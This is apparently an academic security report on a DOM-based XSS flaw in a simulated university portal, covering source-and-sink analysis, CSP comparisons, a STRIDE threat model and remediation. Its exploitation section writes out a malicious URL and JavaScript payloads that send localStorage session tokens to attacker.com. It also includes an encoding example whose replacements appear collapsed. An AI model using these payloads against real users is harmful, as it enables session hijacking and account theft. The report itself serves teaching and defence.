Section 01

Executive Summary

This project demonstrates a critical DOM-Based Cross-Site Scripting (XSS) vulnerability within a simulated academic web portal. The vulnerable application reads attacker-controlled input from a URL parameter (?report=) and injects it directly into the DOM using the dangerous innerHTML sink — without any sanitization or encoding.

The exploitation scenario shows how a malicious actor can leverage this vulnerability to steal session tokens stored in localStorage, effectively performing session hijacking against authenticated users. The project then implements and evaluates multiple Content Security Policy (CSP) configurations, demonstrating that CSP serves as an important mitigation layer but cannot replace secure coding practices.

⚠ Critical Finding

A DOM-based XSS vulnerability + tokens in localStorage = complete session compromise. No CSP configuration fully eliminates this risk when the root vulnerability remains unpatched.

Section 02

Vulnerability Analysis — DOM-Based XSS

What is DOM-Based XSS?

DOM-Based XSS (also classified as Type-0 XSS) is a client-side vulnerability where the attack payload is executed as a result of modifying the DOM environment in the victim's browser. Unlike reflected or stored XSS, the malicious data never reaches the server — the vulnerability exists entirely in the client-side JavaScript.

The OWASP classification places DOM XSS under CWE-79 (Improper Neutralization of Input During Web Page Generation). It is listed under OWASP Top 10 2021: A03 Injection.

Source & Sink Analysis

Every DOM XSS vulnerability involves a source (where attacker-controlled data enters) and a sink (where that data is unsafely consumed). In our application:

JavaScript ⚠ Vulnerable Pattern — dashboard.html 
// ── SOURCE: URL parameter (attacker-controlled) ─────────────
const params = new URLSearchParams(window.location.search);
const report = params.get('report');
// report = <img src=x onerror="stealToken()">  ← attacker controls this

// ── SINK: innerHTML — renders raw HTML/JS ────────────────────
document.getElementById('renderZone').innerHTML = report;
//                                          ^^^^^^^^^^^^^^^^^^^
//                                          DANGEROUS SINK
//                                          Executes embedded JS

Why is innerHTML Dangerous?

The innerHTML property parses its argument as HTML, which means any embedded JavaScript — such as event handlers (onerror, onload) or <script> tags — is executed in the context of the page. This grants the attacker full access to the DOM, cookies, and browser storage.

Safe alternatives include textContent (treats input as plain text, never parses HTML) or using a trusted sanitization library such as DOMPurify before passing to innerHTML.

JavaScript ✅ Secure Alternatives 
// Option 1: textContent (safest — no HTML parsing)
document.getElementById('renderZone').textContent = report;

// Option 2: DOMPurify sanitization (allows safe HTML)
const clean = DOMPurify.sanitize(report);
document.getElementById('renderZone').innerHTML = clean;

// Option 3: Encode special characters before insertion
const encoded = report
  .replace(/&/g, '&')
  .replace(/</g, '<')
  .replace(/>/g, '>');
document.getElementById('renderZone').innerHTML = encoded;

Exploitation Scenario & Impact

Attack Flow

The exploitation chain consists of four steps: the attacker crafts a malicious URL, sends it to an authenticated victim, the victim's browser executes the payload, and the attacker receives the stolen session token.

Attack URL Crafted Malicious Link 
https://portal.example.edu/dashboard.html?report=
  <img src=x onerror="
    fetch('https://attacker.com/steal?t='+localStorage.getItem('auth_token'))
  ">

Token Exfiltration Payload

JavaScript Payload Session Hijacking via localStorage 
// Executes in victim browser context when onerror fires:
const token = localStorage.getItem('auth_token');
const user  = localStorage.getItem('auth_user');

// Exfiltrate to attacker's server
new Image().src = `https://attacker.com/steal
  ?token=${encodeURIComponent(token)}
  &user=${encodeURIComponent(user)}`;

// OR using fetch (if no CSP blocks it):
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token, user })
});

Section 04

Content Security Policy — Comparative Evaluation

Content Security Policy is an HTTP response header (or meta tag) that instructs browsers to restrict which resources can be loaded and executed. It provides a secondary defense layer but — critically — cannot prevent DOM manipulation since it operates at the script-execution level, not at the DOM API level.

Configuration Comparison

CSP Config Inline Scripts Event Handlers External Scripts HTML Injection Token Theft
No CSP ✗ Allowed ✗ Allowed ✗ Allowed ✗ Possible ✗ Easy
unsafe-inline ✗ Allowed ✗ Allowed ~ Limited ✗ Possible ✗ Easy
script-src 'self' ✓ Blocked ✗ Allowed* ✓ Blocked ✗ Possible ~ Harder
Strict nonce-based ✓ Blocked ✓ Blocked ✓ Blocked ✗ Still Possible ~ Mitigated

* Event handlers via innerHTML may still fire in some browser CSP implementations.

Why CSP Cannot Fix DOM XSS

CSP operates at the browser's script loading and execution layer. However, DOM XSS exploits the fact that JavaScript is already executing on the page — it uses the victim page's own JS context to interact with the DOM. When the attacker's payload executes inside an event handler injected via innerHTML, it runs as part of the legitimate page's script — not as a separately loaded script that CSP could block.

⚠ False Sense of Security

Organizations that deploy weak CSP headers (e.g., including unsafe-inline) often believe they are protected against XSS. This creates a dangerous false sense of security. Weak CSP provides essentially no protection against DOM-based XSS with event handler payloads.

HTTP Header Recommended Strict CSP Configuration 
# Server-side HTTP header (recommended)
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM_PER_REQUEST}';
  style-src 'self' 'nonce-{RANDOM_PER_REQUEST}';
  img-src 'self' data:;
  connect-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';

# ⚠ NEVER use:
script-src 'unsafe-inline'    ← negates all CSP protection
script-src 'unsafe-eval'       ← allows eval(), setTimeout(string)

Threat Model

Using the STRIDE threat modeling framework, we identify the following threats applicable to this system:

Spoofing
Session Impersonation

Attacker uses stolen auth_token to authenticate as victim without knowing their password.

Tampering
DOM Manipulation

Injected HTML modifies page content — grades, messages, or UI elements can be altered in the victim's view.

Information Disclosure
Token & Data Theft

localStorage contents including auth tokens, user IDs, and sensitive academic data are exposed to attacker scripts.

Elevation of Privilege
Authenticated Access

An unauthenticated attacker gains authenticated session access by sending the crafted URL to a logged-in user.

Attack Vectors

The most realistic delivery vector is via phishing: the attacker sends the malicious URL to a student via email, SMS, or a compromised forum. Social engineering (e.g., "view your updated grades here") makes the click highly likely. The URL appears to point to the legitimate portal, reducing victim suspicion.

Section 06

Recommendations & Remediation

01
Fix the Root Cause: Eliminate innerHTML with User Input

Replace all innerHTML assignments that use URL parameters, form data, or any user-controlled sources with textContent. If rich HTML rendering is required, use DOMPurify.sanitize() before assignment. This is the ONLY real fix — CSP alone is insufficient.

02
Migrate Session Tokens from localStorage to HttpOnly Cookies

Tokens stored in localStorage are accessible to any JavaScript on the page. Using HttpOnly; Secure; SameSite=Strict cookies makes them invisible to JavaScript entirely, preventing token theft even if XSS occurs.

03
Deploy a Strict Nonce-Based Content Security Policy

Generate a cryptographically random nonce per request server-side and include it in the CSP header and all legitimate <script> tags. This blocks all injected scripts from executing. Never use unsafe-inline or unsafe-eval.

04
Implement Trusted Types API

The Trusted Types browser API prevents dangerous DOM sinks (innerHTML, document.write) from accepting raw strings. All assignments must go through a declared policy that sanitizes the data. This enforces secure-by-default DOM manipulation across the entire codebase.

05
Input Validation & Output Encoding

Validate all URL parameters on arrival and apply context-sensitive output encoding. For HTML context, encode < > " ' &. Use a security-aware framework or template engine that auto-escapes by default (e.g., React, Angular — both use safe rendering by default).

Section 07

Conclusion

This project has demonstrated, through a realistic simulated environment, that DOM-Based XSS remains a critical and underestimated threat in modern web applications. The vulnerability — a single unguarded innerHTML assignment — creates a direct path to complete session compromise.

The comparative analysis of CSP configurations reveals a key insight for security practitioners: CSP is a valuable defense-in-depth mechanism, but it is not — and was never designed to be — a substitute for fixing the underlying vulnerability. Misconfigured CSP (particularly any use of unsafe-inline) provides a false sense of security that can be more dangerous than no CSP at all.

The correct approach is layered: eliminate dangerous sinks at the code level, store sensitive tokens in HttpOnly cookies, deploy strict nonce-based CSP, and implement Trusted Types to enforce secure DOM patterns across the codebase.

✓ Key Takeaways

1. DOM-XSS must be fixed at the source — never rely solely on CSP.
2. Tokens in localStorage are always accessible to injected scripts.
3. Weak CSP (unsafe-inline) provides essentially zero XSS protection.
4. Defense-in-depth requires: secure coding + CSP + HttpOnly cookies + Trusted Types.
5. The attack surface is the link between a user's session and attacker-controlled input.
